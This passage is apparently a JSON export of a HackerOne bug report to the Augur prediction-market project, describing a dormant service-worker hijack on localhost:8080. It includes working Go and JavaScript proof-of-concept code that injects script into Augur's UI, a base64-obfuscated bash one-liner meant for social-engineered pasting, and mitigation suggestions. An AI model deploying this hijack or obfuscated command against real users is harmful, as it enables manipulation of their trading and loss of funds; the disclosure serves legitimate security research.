class=\"n\">HandleFunc</span><span class=\"p\">(</span><span class=\"s\">&quot;/pwner.js&quot;</span><span class=\"p\">,</span><span class=\"x\"> </span><span class=\"k\">func</span><span class=\"p\">(</span><span class=\"n\">w</span><span class=\"x\"> </span><span class=\"n\">http</span><span class=\"o\">.</span><span class=\"n\">ResponseWriter</span><span class=\"p\">,</span><span class=\"x\"> </span><span class=\"n\">r</span><span class=\"x\"> </span><span class=\"o\">*</span><span class=\"n\">http</span><span class=\"o\">.</span><span class=\"n\">Request</span><span class=\"p\">)</span><span class=\"x\"> </span><span class=\"p\">{</span><span class=\"x\">\n        </span><span class=\"n\">w</span><span class=\"o\">.</span><span class=\"n\">Header</span><span class=\"p\">()</span><span class=\"o\">.</span><span class=\"n\">Set</span><span class=\"p\">(</span><span class=\"s\">&quot;Content-Type&quot;</span><span class=\"p\">,</span><span class=\"x\"> </span><span class=\"s\">&quot;text/javascript&quot;</span><span class=\"p\">)</span><span class=\"x\">\n        </span><span class=\"n\">fmt</span><span class=\"o\">.</span><span class=\"n\">Fprint</span><span class=\"p\">(</span><span class=\"n\">w</span><span class=\"p\">,</span><span class=\"x\"> </span><span class=\"n\">pwner</span><span class=\"p\">)</span><span class=\"x\">\n    </span><span class=\"p\">})</span><span class=\"x\">\n    </span><span class=\"n\">http</span><span class=\"o\">.</span><span class=\"n\">ListenAndServe</span><span class=\"p\">(</span><span class=\"s\">&quot;:8080&quot;</span><span class=\"p\">,</span><span class=\"x\"> </span><span class=\"no\">nil</span><span class=\"p\">)</span><span class=\"x\">\n</span><span class=\"p\">}</span><span class=\"x\">\n\n</span><span class=\"k\">var</span><span class=\"x\"> </span><span class=\"n\">index</span><span class=\"x\"> </span><span class=\"o\">=</span><span class=\"x\"> </span><span class=\"s\">`\n&lt;html&gt;\n\n&lt;script&gt;\nif (&#39;serviceWorker&#39; in navigator) {\n  navigator.serviceWorker.register(&#39;/pwner.js&#39;)\n  .then(function(registration) {\n    console.log(&#39;Registration successful, scope is:&#39;, registration.scope);\n  })\n  .catch(function(error) {\n    console.log(&#39;Service worker registration failed, error:&#39;, error);\n  });\n}\n&lt;/script&gt;\n\n&lt;img id=&#39;gopher&#39;/&gt;\n&lt;script&gt;\n    setTimeout(function() {\n        document.getElementById(&#39;gopher&#39;).src = &#39;https://gophercises.com/img/gophercises_jumping.gif&#39;;\n    }, 1000)\n&lt;/script&gt;\n&lt;/html&gt;\n`</span><span class=\"x\">\n\n</span><span class=\"k\">var</span><span class=\"x\"> </span><span class=\"n\">pwner</span><span class=\"x\"> </span><span class=\"o\">=</span><span class=\"x\"> </span><span class=\"s\">`\n// Inject ourselves as the base service worker for Augur\nself.addEventListener(&#39;install&#39;, function(event) {\n  console.log(&#39;Service worker installing...&#39;);\n  self.skipWaiting();\n});\n\nself.addEventListener(&#39;activate&#39;, function(event) {\n  console.log(&#39;Service worker activating...&#39;);\n    clients.claim();\n});\n\n// Hijack and HTTP requests, we&#39;re looking for script loads\nself.addEventListener(&#39;fetch&#39;, function(event) {\n  console.log(&#39;Fetching:&#39;, event.request.url);\n  if (event.request.url.startsWith(&quot;http://localhost:8080/main.&quot;)) {\n    // Main Augur application is loading, inject our custom script into it\n    event.respondWith(fetch(event.request.url)\n    .then(function(response) {\n      return response.text();\n    })\n    .then(function(text) {\n      return new Response(text + &#39;\\nsetTimeout(function() { alert(&quot;You are Pwned!&quot;) }, 3000);&#39;);\n    }));\n  }\n});\n`</span><span class=\"x\">\n</span></code></pre>\n<p>What this code does in short is:</p>\n\n<ul>\n<li>Start a Go web server, serving two endpoints: <code>/</code> for the index and <code>/pwner.js</code> for the hijacking service worker.</li>\n<li>The <code>index.html</code> page consists of a tiny script that registers <code>/pwner.js</code> as a service worker. It also displays a jumping gopher for the fun of it.</li>\n<li>The <code>/pwner.js</code> service worker is a simple script that hijacks all network requests, prints a log for each, and if it encounders a request to <code>main.js</code> (augur&#39;s code), it injects some arbitrary JavaScript at the end.</li>\n</ul>\n\n<p>We can run the above code via <code>go run exploit.go</code> (or whatever the name of the file is you saved it into), and load the page from a web browser. It will display a gopher, nothing else. If you check the JavaScript console however, you should see something along the lines of:</p>\n<pre class=\"highlight plaintext\"><code>Registration successful, scope is: http://localhost:8080/\npwner.js:4 Service worker installing...\npwner.js:9 Service worker activating...\npwner.js:15 Fetching: https://gophercises.com/img/gophercises_jumping.gif\n</code></pre>\n<p>At this point you can terminate the Go attacker server and you can close your browser. The hijacker script has been successfully injected to intercept anything on the <code>localhost:8080</code> origin.</p>\n\n<p><strong>Payload execution</strong></p>\n\n<p>Time passes (arbitrary much, we don&#39;t even care) and the user eventually downloads and starts Augur from the official repository and/or client. This will start the Augur App, sync the local database from the Ethereum network. When sync is done, the user pushes the <code>Open Augur App</code> button, loading the Augur UI from the app in the user&#39;s browser.</p>\n\n<p>At this point our previously dormant service worker starts executing, hijacking all network fetches between the UI and the backend service. This permits us to arbitrarily modify the data flow between the user and the service and also permits us to inject arbitrary JavaScript code into the UI itself.</p>\n\n<p>You can see this via the JavaScript alert injected which displays <strong>&quot;You are Pwned!&quot;</strong>.</p>\n\n<h4 id=\"exploit-impact\">Exploit impact</h4>\n\n<p>The impact of the exploit is actually quite significant. By having full control over the network traffic between the UI and the backend server; and also having full control over the UI contents, an attacker can display arbitrary Augur markets, shares, stats, etc.</p>\n\n<p>The attacker <strong>does not</strong> have direct control over user funds, and the attacker <strong>cannot</strong> directly get the user to sign junk transactions. However by modifying the market descriptions and stats, the attacker <strong>can</strong> convince the user to place losing bets (e.g. invert the winning condition), causing loss of funds. The attacker can further place counter bets on the hijacked market, causing a direct gain of funds to themselves.</p>\n\n<p>From a technical perspective, the reason the exploit can be considered of a significant impact is because it <strong>doesn&#39;t require elevated permissions</strong> to run, after running a single time it <strong>remains dormant forever</strong> in the user&#39;s system and it&#39;s a <strong>fully legitimate browser functionality</strong>, so no exploit detection software can ever catch it.</p>\n\n<h4 id=\"exploit-delivery\">Exploit delivery</h4>\n\n<p>The hard part of the exploit however is delivering it to the end user in the first place. As explained above, browsers do enforce Same-Origin security policies against service workers, so the only way to attack Augur on the user&#39;s machine is to have the user load a malicious page from <code>localhost:8080</code> served by themselves.</p>\n\n<p>The Go code above is a nice demo for this, but it&#39;s obviously not a realistic scenario. We need better social engineering attacks to deliver the exploit to the user&#39;s system.</p>\n\n<p><strong>Bash command</strong></p>\n\n<p>One prevalent way nowadays to attack crypto-currency users is to get them to copy paste code from random web pages or chats into their terminal. While it may sound overly dumb, it does seem to work, especially since this particular attack doesn&#39;t even require root access. </p>\n\n<p>The following 791 character bash command will do a full hijack injection including serving up 2 different webpages and automatically pointing the user&#39;s browser to load them and register the service worker.</p>\n<pre class=\"highlight shell\"><code><span class=\"nb\">echo </span>SFRUUC8xLjEgMjAwIE9LDQoNCjxzY3JpcHQ+bmF2aWdhdG9yLnNlcnZpY2VXb3JrZXIucmVnaXN0ZXIoJycpPC9zY3JpcHQ+ | base64 -d | nc -lN 8080 &gt; /dev/null <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">echo </span>SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IHRleHQvamF2YXNjcmlwdA0KDQpzZWxmLmFkZEV2ZW50TGlzdGVuZXIoImluc3RhbGwiLGZ1bmN0aW9uKGV2ZW50KXtzZWxmLnNraXBXYWl0aW5nKCl9KTtzZWxmLmFkZEV2ZW50TGlzdGVuZXIoImZldGNoIixmdW5jdGlvbihldmVudCl7aWYoZXZlbnQucmVxdWVzdC51cmwuc3RhcnRzV2l0aCgiaHR0cDovL2xvY2FsaG9zdDo4MDgwL21haW4uIikpe2V2ZW50LnJlc3BvbmRXaXRoKGZldGNoKGV2ZW50LnJlcXVlc3QudXJsKS50aGVuKGZ1bmN0aW9uKHJlc3BvbnNlKXtyZXR1cm4gcmVzcG9uc2UudGV4dCgpfSkudGhlbihmdW5jdGlvbih0ZXh0KXtyZXR1cm4gbmV3IFJlc3BvbnNlKHRleHQrYApzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7YWxlcnQoIllvdSBhcmUgUHduZWQhIil9LDMwMDApYCl9KSl9fSkK | base64 -d | nc -lN 8080 &gt; /dev/null &amp; xdg-open http://localhost:8080\n</code></pre>\n<p>Whilst it may look a bit innocuous, an attacker could easily hide this in a larger script that actually does something useful. Since the exploit injection doesn&#39;t <strong>do</strong> anything immediate, a vulnerable user will be oblivious of the dormant exploit on his machine waiting to execute.</p>\n\n<p><strong>Hijack 8080 services</strong></p>\n\n<p>Port <code>8080</code> on <code>localhost</code> is the de facto standard port for running just about any web service. Web developers are used to running their development code on it. Many services, monitoring tools, etc like to run on some variation of <code>8080</code>. This means hijacking port <code>8080</code> on developer machines has an elevated probability, since it only requires a few lines in any web dependency, which need to execute a single time, can be deleted afterwards without trace.</p>\n\n<p>Although developers will probably be reluctant to run arbitrary code on their machine (although lets be honest, we all ran <strong>that awesome script</strong> from GitHub for whatever reason), this exploit is particularly nasty as it runs in a fully sandboxed environment (user&#39;s browser), so noone expects that a single page load can leave arbitrary armed code behind.</p>\n\n<h4 id=\"suggestions\">Suggestions</h4>\n\n<p>At the very core, it seems that running the Augur UI in the user&#39;s browser from <code>localhost</code> might not have been the most enlightened decision due to <code>origin</code> clashes. Browsers always treat <code>localhost</code> as a special snowflake when it comes to security policies and I can imagine plenty of future vulnerabilities might originate from this. If Augur is relying on Electron for a lot of its functinality, it might make sense to ship the entire browser with Augur too and to have a dedicated process solely for Augur. That would prevent old browser sessions leaking malicious scripts into new ones.</p>\n\n<p>Running on port <code>8080</code> is again a less fortunate decision, since <code>origin</code> wise it clashes with just too many other providers and also clashes with developer&#39;s default choice. Running on some weird port number should not have any impact on user experience, but should make it a lot harder to deliver an exploit on that particular port opposed to the common 8080.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>The impact of the exploit is actually quite significant. By having full control over the network traffic between the UI and the backend server; and also having full control over the UI contents, an attacker can display arbitrary Augur markets, shares, stats, etc.</p>\n\n<p>The attacker <strong>does not</strong> have direct control over user funds, and the attacker <strong>cannot</strong> directly get the user to sign junk transactions. However by modifying the market descriptions and stats, the attacker <strong>can</strong> convince the user to place losing bets (e.g. invert the winning condition), causing loss of funds. The attacker can further place counter bets on the hijacked market, causing a direct gain of funds to themselves.</p>\n\n<p>From a technical perspective, the reason the exploit can be considered of a significant impact is because it <strong>doesn&#39;t require elevated permissions</strong> to run, after running a single time it <strong>remains dormant forever</strong> in the user&#39;s system and it&#39;s a <strong>fully legitimate browser functionality</strong>, so no exploit detection software can ever catch it.</p>\n", 
+    "severity_rating": "low", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://augur.net", 
+            "about": "Augur is a decentralized prediction market platform built on Ethereum.", 
+            "twitter_handle": "AugurProject", 
+            "name": "Augur"
+        }, 
+        "handle": "augurproject", 
+        "url": "https://hackerone.com/augurproject", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/024/066/b15d1964080b5df2c430ffc819b57590d7d47445_small.?1509325667", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/024/066/109d493c62ac4f1e4468ed57c37c9e651b3ab7b9_medium.?1509325667"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 24066, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
